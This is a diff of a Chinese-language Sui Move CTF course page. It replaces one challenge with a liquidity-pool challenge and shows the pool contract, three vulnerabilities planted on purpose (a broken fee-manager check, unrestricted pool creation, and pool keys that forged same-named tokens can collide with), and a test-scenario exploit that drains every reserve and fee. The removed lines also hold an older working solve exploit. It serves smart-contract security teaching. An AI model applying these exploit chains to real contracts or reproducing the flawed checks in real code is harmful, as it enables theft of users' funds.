@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>实践：攻破综合漏洞 - lets move ctf</title>
+        <title>实践：多步骤综合挑战 - lets move ctf</title>
 
 
         <!-- Custom HTML head -->
@@ -156,268 +156,482 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="实践多步骤综合挑战"><a class="header" href="#实践多步骤综合挑战">实践：多步骤综合挑战</a></h1>
-<h2 id="示例合约"><a class="header" href="#示例合约">示例合约</a></h2>
-<p><code>chapter_8::auth</code> 代码</p>
-<pre><code>module chapter_8::auth {
-    use sui::transfer::{share_object};
-    use sui::balance::{Self, Balance};
+<h2 id="题目描述"><a class="header" href="#题目描述">题目描述</a></h2>
+<p>在本次Sui Move CTF课程的最后，你将结合前面学习到的内容尝试破解一个综合多个漏洞的CTF题目。你面对一个 Sui Move 实现的流动性池合约，合约允许用户在两组代币对之间进行兑换（swap），并收取一定手续费。你的目标是通过分析合约逻辑，结合前面学习到的漏洞，利用合约提供的swap函数，最终让合约中所有代币余额与累计手续费之和为零（即所有资产被偷走），从而通过 <code>is_solved</code> 函数获得 flag。flag 会以事件形式输出，格式为 CTF{xxx}。</p>
+<h2 id="示例代码"><a class="header" href="#示例代码">示例代码</a></h2>
+<p>以下是本次CTF task8题目的代码：</p>
+<pre><code class="language-move">
+module task8::token1 {
+    use sui::coin;
+    public struct TOKEN1 has drop {}
+
+    fun init(witness: TOKEN1, ctx: &amp;mut TxContext) {
+        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token1", b"", b"", option::none(), ctx);
+        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
+        transfer::public_freeze_object(coin_metadata);
+    }
+
+}
+
+module task8::token2 {
+    use sui::coin;
+    public struct TOKEN2 has drop {}
+
+    fun init(witness: TOKEN2, ctx: &amp;mut TxContext) {
+        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token2", b"", b"", option::none(), ctx);
+        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
+        transfer::public_freeze_object(coin_metadata);
+    }
+
+}
+
+module task8::token3 {
+    use sui::coin;
+    public struct TOKEN3 has drop {}
+
+    fun init(witness: TOKEN3, ctx: &amp;mut TxContext) {
+        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token3", b"", b"", option::none(), ctx);
+        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
+        transfer::public_freeze_object(coin_metadata);
+    }
+
+}
+
+module task8::token4 {
+    use sui::coin;
+    public struct TOKEN4 has drop {}
+
+    fun init(witness: TOKEN4, ctx: &amp;mut TxContext) {
+        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token4", b"", b"", option::none(), ctx);
+        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
+        transfer::public_freeze_object(coin_metadata);
+    }
+
+}
+
+module task8::pool {
     use sui::coin::{Self, Coin};
-    use chapter_8::vote::{VOTE, VotingSystem, is_authorized as vote_authorized};
+    use task8::token1::{TOKEN1};
+    use task8::token2::{TOKEN2};
+    use task8::token3::{TOKEN3};
+    use task8::token4::{TOKEN4};
+
+    use sui::bag::{Self, Bag};
     use std::type_name::{Self, TypeName};
-    use sui::transfer::public_transfer;
+    use std::ascii::String;
+    use std::ascii::{Self};
 
-    public struct Credential&lt;phantom T&gt; has key, store {
+
+    use sui::balance::{Self, Balance};
+    use sui::event;
+
+    public struct AdminCap has key { id: UID }
+
+    public struct Pools has key, store {
         id: UID,
-        verified: bool,
-        fee_paid: Balance&lt;T&gt;,
-        coin_type: TypeName,
+        balance_bag: Bag,
+        pool_bag: Bag,       
+        fee_manager: address,
+        cap_bag: Bag,
+        free_mint: bool, 
     }
 
-    public struct Auth has key {
-        id: UID,
-        authorized: bool,
-        admin: address,
-        min_fee: u64,
-        vote_dependency: Option&lt;address&gt;,
-        valid_coin_type: TypeName,
+    public struct Pool has store, drop {
+        token_1: TypeName,
+        token_2: TypeName,
+        reserve_1: u64,
+        reserve_2: u64,
+        fee: u64,
+        fee_amount_1: u64,
+        fee_amount_2: u64,
     }
 
+    public struct PoolCap&lt;phantom X, phantom Y&gt; has key, store { 
+        id: UID,
+    }
+
+    public struct Flag has copy, drop {
+        user: address,
+    }
+
+    // init for admin
     fun init(ctx: &amp;mut TxContext) {
-        let auth = Auth {
+        transfer::transfer(AdminCap {
+            id: object::new(ctx)
+        }, tx_context::sender(ctx));
+
+        transfer::share_object(Pools {
             id: object::new(ctx),
-            admin: ctx.sender(),
-            authorized: false,
-            min_fee: 50,
-            vote_dependency: option::none(),
-            valid_coin_type: type_name::get&lt;Coin&lt;VOTE&gt;&gt;(),
-        };
-        share_object(auth);
+            balance_bag: bag::new(ctx),
+            pool_bag: bag::new(ctx),
+            fee_manager: tx_context::sender(ctx),
+            cap_bag: bag::new(ctx),
+            free_mint: false
+        });
     }
 
-    public fun register&lt;T&gt;(
-        auth: &amp;mut Auth,
-        payment: Coin&lt;T&gt;,
-        vote_system: &amp;mut VotingSystem,
-        ctx: &amp;mut TxContext
-    ): Credential&lt;T&gt; {
-        let amount = coin::value(&amp;payment);
-
-        assert!(amount &gt;= auth.min_fee, 1);
-
-        if (option::is_some(&amp;auth.vote_dependency)) {
-            let dep_addr = option::borrow(&amp;auth.vote_dependency);
-            assert!(vote_authorized(vote_system) &amp;&amp; tx_context::sender(ctx) == *dep_addr, 2);
+    public fun get_token&lt;T&gt;(pools: &amp;mut Pools): &amp;mut Balance&lt;T&gt; {
+        let type_name = type_name::into_string(type_name::get&lt;T&gt;());
+        if (!pools.balance_bag.contains(type_name)) {
+            pools.balance_bag.add(type_name, balance::zero&lt;T&gt;());
         };
-
-        let coin_type = type_name::get&lt;Coin&lt;T&gt;&gt;();
-        let fee_balance = coin::into_balance&lt;T&gt;(payment);
-        let credential = Credential {
-            id: object::new(ctx),
-            verified: false,
-            fee_paid: fee_balance,
-            coin_type,
-        };
-
-        credential
+        &amp;mut pools.balance_bag[type_name]
     }
 
-    #[allow(lint(self_transfer))]
-    public fun verify&lt;T&gt;(
-        auth: &amp;mut Auth,
-        credential: &amp;mut Credential&lt;T&gt;,
-        vote_system: &amp;mut VotingSystem,
-        payment: Coin&lt;T&gt;,
-        ctx: &amp;mut TxContext
-    ) {
-        assert!(balance::value(&amp;credential.fee_paid) &gt; auth.min_fee, 3);
-        assert!(coin::value(&amp;payment) &gt;= auth.min_fee, 4);
+    fun get_balance&lt;T&gt;(pools: &amp;mut Pools): u64 {
+        balance::value&lt;T&gt;(get_token(pools))
+    }
+    
+    fun get_total_fee&lt;X, Y&gt;(pools: &amp;mut Pools): u64 {
+        get_pool&lt;X, Y&gt;(pools).fee_amount_1 + get_pool&lt;X, Y&gt;(pools).fee_amount_2
+    }
 
-        if (vote_authorized(vote_system) &amp;&amp; type_name::get&lt;Coin&lt;T&gt;&gt;() == credential.coin_type) {
-            credential.verified = true;
-            auth.authorized = true;
-            balance::join(&amp;mut credential.fee_paid, coin::into_balance(payment));
-        }else{
-            public_transfer(payment, ctx.sender());
+
+    fun get_fee&lt;X, Y&gt;(pools: &amp;mut Pools): u64 {
+        get_pool&lt;X, Y&gt;(pools).fee
+    }
+
+    fun get_struct&lt;X&gt;(): String {
+        let type_name = type_name::get&lt;X&gt;();
+        let address_part = type_name.get_address().length();
+        let module_part = type_name.get_module().length();
+        let full = type_name.borrow_string().length();
+        type_name.borrow_string().substring(address_part + module_part + 4, full)
+    }
+
+    fun get_pool_k&lt;X, Y&gt;(): String {
+        let mut pool_k = get_struct&lt;X&gt;();
+        ascii::append(&amp;mut pool_k, get_struct&lt;Y&gt;());
+        pool_k
+    }
+
+    public fun get_pool&lt;X, Y&gt;(pools: &amp;mut Pools): &amp;mut Pool {
+        let pool = pools.pool_bag.borrow_mut&lt;String, Pool&gt;(
+            get_pool_k&lt;X, Y&gt;(),
+        );
+        pool
+    }
+
+
+    ///////// admin functions
+    public entry fun set_fee_manager(pools: &amp;mut Pools, new_fee_manager: address, ctx: &amp;mut TxContext) {
+        assert!(tx_context::sender(ctx) == new_fee_manager, 0);
+        pools.fee_manager = new_fee_manager;
+    }
+
+    public fun create_pool&lt;X, Y&gt;(pools: &amp;mut Pools, fee: u64, token1: Coin&lt;X&gt;, token2: Coin&lt;Y&gt;, ctx: &amp;mut TxContext): PoolCap&lt;X, Y&gt; {
+        let add1 = token1.value();
+        let add2 = token2.value();
+        balance::join(get_token&lt;X&gt;(pools), coin::into_balance(token1));
+        balance::join(get_token&lt;Y&gt;(pools), coin::into_balance(token2));
+
+        let pool = Pool {
+            token_1: type_name::get&lt;X&gt;(),
+            token_2: type_name::get&lt;Y&gt;(),
+            reserve_1: add1,
+            reserve_2: add2,
+
+            fee,
+            fee_amount_1: 0,
+            fee_amount_2: 0,
+        };
+        if (!pools.pool_bag.contains(get_pool_k&lt;X, Y&gt;())) {
+        pools.pool_bag.add(
+            get_pool_k&lt;X, Y&gt;(),
+            pool
+        );
+        };
+
+        PoolCap&lt;X, Y&gt; {
+            id: object::new(ctx)
         }
     }
 
-    public fun add_self_to_dependency(auth: &amp;mut Auth, ctx: &amp;mut TxContext) {
-        if (option::is_none(&amp;auth.vote_dependency)) {
-            auth.vote_dependency = option::some(tx_context::sender(ctx));
-        }
-    }
+    public fun claim_fees&lt;X, Y&gt;(pools: &amp;mut Pools, _pool_cap: &amp;mut PoolCap&lt;X, Y&gt;, ctx: &amp;mut TxContext): (Coin&lt;X&gt;, Coin&lt;Y&gt;) {
+        assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
+        let fee_1 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_1 &gt; get_balance&lt;X&gt;(pools)) {
+            get_balance&lt;X&gt;(pools)
 
-    public fun is_authorized(auth: &amp;Auth): bool {
-        auth.authorized
-    }
-
-    public fun is_verified&lt;T&gt;(credential: &amp;Credential&lt;T&gt;): bool {
-        credential.verified
-    }
-}
-</code></pre>
-<p><code>chapter_8::flag_vault</code> 代码`</p>
-<pre><code>module chapter_8::flag_vault {
-    use sui::event::emit;
-    use chapter_8::vote::VotingSystem;
-    use chapter_8::auth::Auth;
-    use std::string::{Self, String};
-
-    public struct FlagEvent has copy, drop {
-        flag: String,
-        sender: address,
-    }
-
-    public entry fun get_flag(system: &amp;VotingSystem, auth: &amp;Auth, ctx: &amp;mut TxContext) {
-        assert!(chapter_8::vote::is_authorized(system) &amp;&amp; chapter_8::auth::is_authorized(auth), 1);
-        let sender = tx_context::sender(ctx);
-        emit(FlagEvent { flag: string::utf8(b"CTF{All_Chapters_Combined}"), sender });
-    }
-}
-</code></pre>
-<p><code>chapter_8::math_utils</code> 代码</p>
-<pre><code>module chapter_8::math_utils {
-    public fun calculate_weight(amount: u256): u256 {
-        let (weight, overflow) = check(amount);
-        if (overflow) {
-            999999999
         } else {
-            weight
-        }
-    }
-
-    fun check(n: u256): (u256, bool) {
-        let mask = 0xff - 1;
-        if (n &gt; mask) {
-            (0, true)
-        } else {
-            (n, false)
-        }
-    }
-}
-</code></pre>
-<p><code>chapter_8::vote</code> 代码</p>
-<pre><code>module chapter_8::vote {
-    use sui::coin::{Self, Coin, TreasuryCap};
-    use sui::transfer::{share_object, public_freeze_object};
-    use sui::balance::Balance;
-    use sui::vec_map::{Self, VecMap};
-    use sui::table::{Self, Table};
-    use chapter_8::math_utils;
-
-    public struct VOTE has drop {}
-
-    public struct Votecap has key {
-        id: UID,
-        cap: TreasuryCap&lt;VOTE&gt;,
-    }
-
-    public struct Mintlist has key {
-        id: UID,
-        mintlist: VecMap&lt;address, u64&gt;,
-        reset_count: u64,
-        max_resets: u64,
-    }
-
-    public struct VotingSystem has key {
-        id: UID,
-        balance: Balance&lt;VOTE&gt;,
-        vote_list: Table&lt;address, u64&gt;,
-        is_authorized: bool,
-    }
-
-    fun init(witness: VOTE, ctx: &amp;mut TxContext) {
-        let (treasury_cap, meta) = coin::create_currency(witness, 6, b"VOTE", b"VOTE", b"", option::none(), ctx);
-        let mut vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
-        let mintlist = Mintlist { id: object::new(ctx), mintlist: vec_map::empty(), reset_count: 0, max_resets: 3 };
-        let coin = coin::mint(&amp;mut vote_cap.cap, 10000, ctx);
-        let balance = coin::into_balance(coin);
-        let system = VotingSystem { id: object::new(ctx), balance, vote_list: table::new(ctx), is_authorized: false };
-        public_freeze_object(meta);
-        share_object(vote_cap);
-        share_object(mintlist);
-        share_object(system);
-    }
-
-    public fun mint(vote_cap: &amp;mut Votecap, mint_list: &amp;mut Mintlist, ctx: &amp;mut TxContext): Coin&lt;VOTE&gt; {
-        let addr = tx_context::sender(ctx);
-        assert!(!vec_map::contains(&amp;mint_list.mintlist, &amp;addr) || mint_list.reset_count &lt; mint_list.max_resets, 1);
-        if (vec_map::contains(&amp;mint_list.mintlist, &amp;addr)) {
-            vec_map::remove(&amp;mut mint_list.mintlist, &amp;addr);
-            mint_list.reset_count = mint_list.reset_count + 1;
+            get_pool&lt;X, Y&gt;(pools).fee_amount_1
         };
-        let coin = coin::mint(&amp;mut vote_cap.cap, 100, ctx);
-        vec_map::insert(&amp;mut mint_list.mintlist, addr, 100);
-        coin
+        let fee_2 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_2 &gt; get_balance&lt;Y&gt;(pools)) {
+            get_balance&lt;Y&gt;(pools)
+
+        } else {
+            get_pool&lt;X, Y&gt;(pools).fee_amount_2
+        };
+        get_pool&lt;X, Y&gt;(pools).fee_amount_1 = 0;
+        get_pool&lt;X, Y&gt;(pools).fee_amount_2 = 0;
+        (
+            coin::from_balance(balance::split(get_token&lt;X&gt;(pools), fee_1), ctx),
+            coin::from_balance(balance::split(get_token&lt;Y&gt;(pools), fee_2), ctx)
+        )
+
     }
 
-    public entry fun vote(system: &amp;mut VotingSystem, vote_coin: Coin&lt;VOTE&gt;, ctx: &amp;mut TxContext) {
-        let sender = tx_context::sender(ctx);
-        let amount = coin::value(&amp;vote_coin);
-        system.balance.join(coin::into_balance(vote_coin));
-        if (table::contains(&amp;system.vote_list, sender)) {
-            let current_amount = table::borrow_mut(&amp;mut system.vote_list, sender);
-            *current_amount = *current_amount + amount;
-        } else {
-            table::add(&amp;mut system.vote_list, sender, amount);
+    public entry fun init_pools(_cap: &amp;mut AdminCap, pools: &amp;mut Pools, token1: Coin&lt;TOKEN1&gt;, token2: Coin&lt;TOKEN2&gt;, token3: Coin&lt;TOKEN3&gt;, token4: Coin&lt;TOKEN4&gt;, ctx: &amp;mut TxContext) {
+        let cap1 = create_pool&lt;TOKEN1, TOKEN2&gt;(pools, 2, token1, token2, ctx);
+        let cap2 = create_pool&lt;TOKEN3, TOKEN4&gt;(pools, 2, token3, token4, ctx);
+        pools.cap_bag.add(
+            get_pool_k&lt;TOKEN1, TOKEN2&gt;(),
+            cap1
+        );
+        pools.cap_bag.add(
+            get_pool_k&lt;TOKEN3, TOKEN4&gt;(),
+            cap2
+        );
+    }
+
+    ///////// public functions
+    public fun get_amount_out&lt;X, Y&gt;(pools: &amp;mut Pools, amount_in: u64, order: bool): (u64, u64) {
+        let pool = get_pool&lt;X, Y&gt;(pools);
+
+        let (reserve_in, reserve_out)  = 
+            if (order) {
+                (pool.reserve_1, pool.reserve_2)
+            } else {
+                (pool.reserve_2, pool.reserve_1)
+            };
+
+        let fees_amount = amount_in * get_fee&lt;X, Y&gt;(pools) / 100;
+        let amount_in = amount_in - fees_amount;
+        let amount_out = amount_in * reserve_out / (reserve_in + amount_in);
+        (amount_out, fees_amount)
+    }
+
+    public fun swap_a_2_b&lt;X, Y&gt;(
+        pools: &amp;mut Pools, from: &amp;mut Coin&lt;X&gt;, ctx: &amp;mut TxContext): Coin&lt;Y&gt; {
+        let amount_in = from.value();
+        let (mut amount_out, fee) = get_amount_out&lt;X, Y&gt;(
+            pools,
+            amount_in,
+            true,
+        );
+        if (amount_out &gt; get_pool&lt;X, Y&gt;(pools).reserve_2) {
+            amount_out = get_pool&lt;X, Y&gt;(pools).reserve_2;
         };
-        let total_amount = *table::borrow(&amp;system.vote_list, sender);
-        let weight = math_utils::calculate_weight(total_amount as u256);
-        if (weight &gt; 1000000) {
-            system.is_authorized = true;
+
+        if (amount_out &gt; get_balance&lt;Y&gt;(pools)) {
+            amount_out = get_balance&lt;Y&gt;(pools)
+        };
+
+        let store = get_token&lt;X&gt;(pools);
+        balance::join(store, coin::into_balance(
+            coin::split(from, amount_in, ctx)
+        ));
+        get_pool&lt;X, Y&gt;(pools).fee_amount_1 = get_pool&lt;X, Y&gt;(pools).fee_amount_1 + fee;
+        get_pool&lt;X, Y&gt;(pools).reserve_1 = get_pool&lt;X, Y&gt;(pools).reserve_1 + amount_in - fee;
+        get_pool&lt;X, Y&gt;(pools).reserve_2 = get_pool&lt;X, Y&gt;(pools).reserve_2 - amount_out;
+
+        coin::from_balance(balance::split(get_token&lt;Y&gt;(pools), amount_out), ctx)
+    }
+
+    public fun swap_b_2_a&lt;X, Y&gt;(
+        pools: &amp;mut Pools, from: &amp;mut Coin&lt;Y&gt;, ctx: &amp;mut TxContext): Coin&lt;X&gt; {
+        let amount_in = from.value();
+        let (mut amount_out, fee) = get_amount_out&lt;X, Y&gt;(
+            pools,
+            amount_in,
+            false
+        ); 
+
+        if (amount_out &gt; get_pool&lt;X, Y&gt;(pools).reserve_2) {
+            amount_out = get_pool&lt;X, Y&gt;(pools).reserve_2;
+        };
+
+        if (amount_out &gt; get_balance&lt;X&gt;(pools)) {
+            amount_out = get_balance&lt;X&gt;(pools)
+        };
+
+        let store = get_token&lt;Y&gt;(pools);
+        balance::join(store, coin::into_balance(
+            coin::split(from, amount_in, ctx)
+        ));
+
+        get_pool&lt;X, Y&gt;(pools).fee_amount_2 = get_pool&lt;X, Y&gt;(pools).fee_amount_2 + fee;
+        get_pool&lt;X, Y&gt;(pools).reserve_2 = get_pool&lt;X, Y&gt;(pools).reserve_2 + amount_in - fee;
+        get_pool&lt;X, Y&gt;(pools).reserve_1 = get_pool&lt;X, Y&gt;(pools).reserve_1 - amount_out;
+
+
+        coin::from_balance(balance::split(get_token&lt;X&gt;(pools), amount_out), ctx)
+    }
+
+    // check whether you can get the flag
+    public entry fun is_solved(pools: &amp;mut Pools, ctx: &amp;mut TxContext) {
+        let sum = get_balance&lt;TOKEN1&gt;(pools) + get_balance&lt;TOKEN2&gt;(pools) + get_balance&lt;TOKEN3&gt;(pools) + get_balance&lt;TOKEN4&gt;(pools);
+        let fee_sum = get_total_fee&lt;TOKEN1, TOKEN2&gt;(pools) + get_total_fee&lt;TOKEN3, TOKEN4&gt;(pools);
+        assert!(sum + fee_sum == 0, 0);
+        event::emit(Flag { user: tx_context::sender(ctx) })
+    }
+
+
+    #[test_only]
+    public fun init_for_testing(ctx: &amp;mut TxContext) {
+        init(ctx); 
+    }
+
+}
+
+</code></pre>
+<h2 id="任务目标"><a class="header" href="#任务目标">任务目标</a></h2>
+<p>理解代码，找到代码中隐藏的多个漏洞，构造攻击链，耗尽pool中的所有代币与手续费。</p>
+<pre><code class="language-move">    public entry fun is_solved(pools: &amp;mut Pools, ctx: &amp;mut TxContext) {
+        let sum = get_balance&lt;TOKEN1&gt;(pools) + get_balance&lt;TOKEN2&gt;(pools) + get_balance&lt;TOKEN3&gt;(pools) + get_balance&lt;TOKEN4&gt;(pools);
+        let fee_sum = get_total_fee&lt;TOKEN1, TOKEN2&gt;(pools) + get_total_fee&lt;TOKEN3, TOKEN4&gt;(pools);
+        assert!(sum + fee_sum == 0, 0);
+        event::emit(Flag { user: tx_context::sender(ctx) })
+    }
+</code></pre>
+<h2 id="题目中的漏洞"><a class="header" href="#题目中的漏洞">题目中的漏洞</a></h2>
+<h3 id="漏洞1-权限控制漏洞"><a class="header" href="#漏洞1-权限控制漏洞">漏洞1. 权限控制漏洞</a></h3>
+<p>设置费用管理者存在权限漏洞，函数中检查了<code>new_fee_manager</code>是否是<code>tx_context::sender</code>，正确的应该是检查<code>pools.fee_manager</code>是否是<code>pools.fee_manager</code>，这里的权限检查漏洞可以让我们直接成为pools费用管理者。</p>
+<pre><code>    ///////// admin functions
+    public entry fun set_fee_manager(pools: &amp;mut Pools, new_fee_manager: address, ctx: &amp;mut TxContext) {
+        assert!(tx_context::sender(ctx) == new_fee_manager, 0);
+        pools.fee_manager = new_fee_manager;
+    }
+</code></pre>
+<h3 id="漏洞2-权限检查绕过"><a class="header" href="#漏洞2-权限检查绕过">漏洞2. 权限检查绕过</a></h3>
+<p><code>create_pool</code>函数没有权限控制，且没有对创建的pool进行重复性检查，意味着我们可以重复创建pool，拿到对应的X，Y pool的<code>PoolCap</code>。</p>
+<pre><code class="language-move">    public fun create_pool&lt;X, Y&gt;(pools: &amp;mut Pools, fee: u64, token1: Coin&lt;X&gt;, token2: Coin&lt;Y&gt;, ctx: &amp;mut TxContext): PoolCap&lt;X, Y&gt; {
+        let add1 = token1.value();
+        let add2 = token2.value();
+        balance::join(get_token&lt;X&gt;(pools), coin::into_balance(token1));
+        balance::join(get_token&lt;Y&gt;(pools), coin::into_balance(token2));
+
+        let pool = Pool {
+            token_1: type_name::get&lt;X&gt;(),
+            token_2: type_name::get&lt;Y&gt;(),
+            reserve_1: add1,
+            reserve_2: add2,
+
+            fee,
+            fee_amount_1: 0,
+            fee_amount_2: 0,
+        };
+        if (!pools.pool_bag.contains(get_pool_k&lt;X, Y&gt;())) {
+        pools.pool_bag.add(
+            get_pool_k&lt;X, Y&gt;(),
+            pool
+        );
+        };
+
+        PoolCap&lt;X, Y&gt; {
+            id: object::new(ctx)
         }
     }
-
-    public fun withdraw(system: &amp;mut VotingSystem, ctx: &amp;mut TxContext): Coin&lt;VOTE&gt; {
-        let amount = *table::borrow(&amp;system.vote_list, ctx.sender());
-        let coin = coin::from_balance(system.balance.split(amount), ctx);
-        coin
-    }
-
-    public fun is_authorized(system: &amp;VotingSystem): bool {
-        system.is_authorized
-    }
-}
 </code></pre>
-<h2 id="解题合约"><a class="header" href="#解题合约">解题合约</a></h2>
-<p><code>solve_chapter_8::solve</code> 代码</p>
-<pre><code>module solve_chapter_8::solve{
-
-    use chapter_8::vote::{mint, vote, withdraw, Votecap, Mintlist, VotingSystem, VOTE};
-    use chapter_8::flag_vault::get_flag;
-    use chapter_8::auth::{register, add_self_to_dependency , verify};
-    use chapter_8::auth::Auth;
-    use sui::transfer::public_transfer;
-
-    #[allow(lint(self_transfer))]
-    public fun solve(
-        vote_cap: &amp;mut Votecap,
-        mint_list: &amp;mut Mintlist,
-        system: &amp;mut VotingSystem,
-        auth: &amp;mut Auth,
-        ctx: &amp;mut TxContext
-    ){
-        let coin = mint(vote_cap, mint_list, ctx);
-        //100
-        vote(system,coin,ctx);
-        let coin1 = withdraw(system, ctx);
-        //200
-        vote(system,coin1,ctx);
-        let coin2 = withdraw(system, ctx);
-        //400
-        vote(system,coin2,ctx);
-        let coin3 = withdraw(system, ctx);
-        add_self_to_dependency(auth,ctx);
-
-        let mut cet = register&lt;VOTE&gt;(auth,coin3, system,ctx);
-        let coin4 = withdraw(system, ctx);
-        verify&lt;VOTE&gt;(auth,&amp;mut cet,system,coin4,ctx);
-
-        get_flag(system, auth, ctx);
-
-        public_transfer(cet, ctx.sender());
+<h2 id="漏洞3-创建池期间使用的种子并不唯一"><a class="header" href="#漏洞3-创建池期间使用的种子并不唯一">漏洞3. 创建池期间使用的种子并不唯一</a></h2>
+<p>合约中存储的pool key是根据X coin和Y coin的结构体名来生成，这意味着这里生成的种子并不唯一，可以通过使用同名的X coin 和Y coin，也就是伪造的coin来攻击</p>
+<pre><code class="language-move">    fun get_struct&lt;X&gt;(): String {
+        let type_name = type_name::get&lt;X&gt;();
+        let address_part = type_name.get_address().length();
+        let module_part = type_name.get_module().length();
+        let full = type_name.borrow_string().length();
+        type_name.borrow_string().substring(address_part + module_part + 4, full)
     }
-}
+
+    fun get_pool_k&lt;X, Y&gt;(): String {
+        let mut pool_k = get_struct&lt;X&gt;();
+        ascii::append(&amp;mut pool_k, get_struct&lt;Y&gt;());
+        pool_k
+    }
+
+    public fun get_pool&lt;X, Y&gt;(pools: &amp;mut Pools): &amp;mut Pool {
+        let pool = pools.pool_bag.borrow_mut&lt;String, Pool&gt;(
+            get_pool_k&lt;X, Y&gt;(),
+        );
+        pool
+    }
+</code></pre>
+<h2 id="攻击链构造"><a class="header" href="#攻击链构造">攻击链构造</a></h2>
+<p>我们的目的是掏空pool的所有资金和手续费，我们可以通过漏洞1和漏洞2成为协议的费用管理者并且拿到<code>poolcap</code>，就能够提取协议的手续费。通过漏洞3可以通过伪造的Coin把协议的资金掏空。</p>
+<pre><code class="language-move">    public fun claim_fees&lt;X, Y&gt;(pools: &amp;mut Pools, _pool_cap: &amp;mut PoolCap&lt;X, Y&gt;, ctx: &amp;mut TxContext): (Coin&lt;X&gt;, Coin&lt;Y&gt;) {
+        assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
+        let fee_1 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_1 &gt; get_balance&lt;X&gt;(pools)) {
+            get_balance&lt;X&gt;(pools)
+
+        } else {
+            get_pool&lt;X, Y&gt;(pools).fee_amount_1
+        };
+        let fee_2 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_2 &gt; get_balance&lt;Y&gt;(pools)) {
+            get_balance&lt;Y&gt;(pools)
+
+        } else {
+            get_pool&lt;X, Y&gt;(pools).fee_amount_2
+        };
+        get_pool&lt;X, Y&gt;(pools).fee_amount_1 = 0;
+        get_pool&lt;X, Y&gt;(pools).fee_amount_2 = 0;
+        (
+            coin::from_balance(balance::split(get_token&lt;X&gt;(pools), fee_1), ctx),
+            coin::from_balance(balance::split(get_token&lt;Y&gt;(pools), fee_2), ctx)
+        )
+
+    }
+</code></pre>
+<h2 id="题解"><a class="header" href="#题解">题解</a></h2>
+<p>具体的解题步骤如下：我们创建了假的<code>TOKEN1</code>，<code>TOKEN2</code>，<code>TOKEN3</code>，<code>TOKEN4</code>，然后调用<code>swap_b_2_a</code>和<code>swap_a_2_b</code>函数来耗尽pool（漏洞3），调用<code>set_fee_manager</code>函数将自己设置为<code>fee_manager</code>（漏洞1）,通过调用<code>create_pool</code>函数拿到<code>poolcap</code>（漏洞2），提取协议费用，最终拿到了flag。</p>
+<pre><code class="language-move">        // ////////////// user 
+        let user = @0x1235;
+        test_scenario::next_tx(scenario, user);
+        {
+            let mut pools = test_scenario::take_shared&lt;Pools&gt;(scenario);
+            
+            let mut in = mint_for_testing&lt;TOKEN2&gt;(8000, test_scenario::ctx(scenario));
+            let out = swap_b_2_a&lt;T_TOKEN1, TOKEN2&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
+
+            transfer::public_transfer(out, user);
+            transfer::public_transfer(in, user);
+   
+            let mut in = mint_for_testing&lt;TOKEN1&gt;(8000, test_scenario::ctx(scenario));
+            let out = swap_a_2_b&lt;TOKEN1, T_TOKEN2&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
+            transfer::public_transfer(out, user);
+            transfer::public_transfer(in, user);
+
+            set_fee_manager(&amp;mut pools, user, test_scenario::ctx(scenario));
+            let mut cap = create_pool&lt;T_TOKEN1, T_TOKEN2&gt;(&amp;mut pools, 0, coin::zero&lt;T_TOKEN1&gt;(test_scenario::ctx(scenario)), coin::zero&lt;T_TOKEN2&gt;(test_scenario::ctx(scenario)), test_scenario::ctx(scenario));
+            let (x, y) = claim_fees&lt;T_TOKEN1, T_TOKEN2&gt;(&amp;mut pools, &amp;mut cap, test_scenario::ctx(scenario));
+            transfer::public_transfer(x, user);
+            transfer::public_transfer(y, user);
+            transfer::public_transfer(cap, user);
+
+            test_scenario::return_shared(pools);
+        };
+
+        test_scenario::next_tx(scenario, user);
+        {
+            let mut pools = test_scenario::take_shared&lt;Pools&gt;(scenario);
+            let mut in = mint_for_testing&lt;TOKEN4&gt;(8000, test_scenario::ctx(scenario));
+            let out = swap_b_2_a&lt;T_TOKEN3, TOKEN4&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
+            transfer::public_transfer(out, user);
+            transfer::public_transfer(in, user);
+   
+            let mut in = mint_for_testing&lt;TOKEN3&gt;(8000, test_scenario::ctx(scenario));
+            let out = swap_a_2_b&lt;TOKEN3, T_TOKEN4&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
+            transfer::public_transfer(out, user);
+            transfer::public_transfer(in, user);
+
+            set_fee_manager(&amp;mut pools, user, test_scenario::ctx(scenario));
+            let mut cap = create_pool&lt;T_TOKEN3, T_TOKEN4&gt;(&amp;mut pools, 0, coin::zero&lt;T_TOKEN3&gt;(test_scenario::ctx(scenario)), coin::zero&lt;T_TOKEN4&gt;(test_scenario::ctx(scenario)), test_scenario::ctx(scenario));
+            let (x, y) = claim_fees&lt;T_TOKEN3, T_TOKEN4&gt;(&amp;mut pools, &amp;mut cap, test_scenario::ctx(scenario));
+            transfer::public_transfer(x, user);
+            transfer::public_transfer(y, user);
+            transfer::public_transfer(cap, user);
+
+
+            test_scenario::return_shared(pools);
+        };
+
+        let user = @0x1235;
+        test_scenario::next_tx(scenario, user);
+        {
+            let mut pools = test_scenario::take_shared&lt;Pools&gt;(scenario);
+            is_solved(&amp;mut pools, test_scenario::ctx(scenario));
+            test_scenario::return_shared(pools);
+        };
+
+        test_scenario::end(scenario_val);
 </code></pre>
 
                     </main>
